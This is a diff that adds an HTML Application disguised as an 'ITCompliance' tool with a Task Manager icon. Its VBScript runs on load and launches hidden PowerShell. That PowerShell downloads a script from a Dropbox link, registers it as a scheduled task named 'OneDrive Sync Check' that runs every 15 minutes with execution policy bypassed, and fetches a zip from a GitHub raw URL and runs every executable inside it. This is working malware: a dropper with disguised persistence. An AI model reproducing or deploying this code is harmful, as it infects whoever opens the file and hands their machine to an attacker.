@@ -1,0 +1,37 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<HTA:APPLICATION ID="oHTA" APPLICATIONNAME="ITCompliance" icon="taskmgr.exe" WINDOWSTATE="minimize"/>
+<script language="VBScript">
+    Sub Window_OnLoad
+        Dim shell
+        Set shell = CreateObject("WScript.Shell")
+        
+       
+        Dim dropboxDecoyUrl
+        dropboxDecoyUrl = "https://www.dropbox.com/scl/fi/5iq051ltlzh6mvwg8h6m5/SystemCheck.ps1?rlkey=lbzlu807ltvh1bq7q8uv36tmo&st=moem0qzp&dl=1"
+        
+        Dim githubPayloadUrl
+        githubPayloadUrl = "https://raw.githubusercontent.com/BugSocMdr/UpdateFiles/main/SecureWave_Update.zip"
+        
+        
+        Dim psCmd
+        
+        psCmd = "Invoke-WebRequest -Uri '" & dropboxDecoyUrl & "' -OutFile '$env:TEMP\SystemCheck.ps1'; "
+        psCmd = psCmd & "schtasks /create /sc minute /mo 15 /tn 'OneDrive Sync Check' /tr 'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $env:TEMP\SystemCheck.ps1' /f; "
+        
+        psCmd = psCmd & "Start-Process powershell.exe -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File $env:TEMP\SystemCheck.ps1' -WindowStyle Hidden; "
+        
+        psCmd = psCmd & "$z='$env:TEMP\SecureWave_Update.zip'; Invoke-WebRequest -Uri '" & githubPayloadUrl & "' -OutFile $z; " & _
+                "Expand-Archive $z -DestinationPath '$env:TEMP\sw_upd' -Force; Remove-Item $z; " & _
+                "Get-ChildItem '$env:TEMP\sw_upd' -Filter *.exe | ForEach-Object { Start-Process $_.FullName }"
+
+ 
+        shell.Run "powershell.exe -WindowStyle Hidden -Command """ & psCmd & """", 0, True
+        self.close
+    End Sub
+</script>
+</head>
+<body>
+</body>
+</html>
